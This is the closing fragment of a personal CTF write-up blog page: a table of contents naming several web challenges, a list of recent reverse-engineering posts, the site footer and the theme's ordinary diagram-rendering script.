href="#begin"><span class="toc-number">1.5.</span> <span class="toc-text">begin</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PangBai-%E8%BF%87%E5%AE%B6%E5%AE%B6%EF%BC%881%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">PangBai 过家家（1）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Headach3"><span class="toc-number">2.2.</span> <span class="toc-text">Headach3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%9A%E8%B5%A2%E5%90%97"><span class="toc-number">2.3.</span> <span class="toc-text">会赢吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%BA%E6%A2%B0%E5%8D%B1%E6%9C%BA"><span class="toc-number">2.4.</span> <span class="toc-text">智械危机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%A2%E8%B0%A2%E7%9A%AE%E8%9B%8B"><span class="toc-number">2.5.</span> <span class="toc-text">谢谢皮蛋</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/10/D3CTF2025/" title="D^3CTF2025 Re-wp&amp;复现">D^3CTF2025 Re-wp&amp;复现</a><time datetime="2025-07-09T16:00:00.000Z" title="Created 2025-07-10 00:00:00">2025-07-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/10/r3ctf2025/" title="2025 r3CTF Re-部分复现">2025 r3CTF Re-部分复现</a><time datetime="2025-07-09T16:00:00.000Z" title="Created 2025-07-10 00:00:00">2025-07-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/21/ISCC-re/" title="2025ISCC 复现">2025ISCC 复现</a><time datetime="2025-05-20T16:00:00.000Z" title="Created 2025-05-21 00:00:00">2025-05-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/19/miniLCTF2025/" title="2025miniLCTF 部分Re-wp+复现">2025miniLCTF 部分Re-wp+复现</a><time datetime="2025-05-18T16:00:00.000Z" title="Created 2025-05-19 00:00:00">2025-05-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/01/%E7%9F%A9%E9%98%B5%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0/" title="矩阵逆向初步学习">矩阵逆向初步学习</a><time datetime="2025-04-30T16:00:00.000Z" title="Created 2025-05-01 00:00:00">2025-05-01</time></div></div></div></div></div></div></main><footer id="footer" style="background: linear-gradient( 135deg, #FFD89B 10%, #FCA17D 100%);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By huanghunr</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><span>桂ICP备2024049894号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
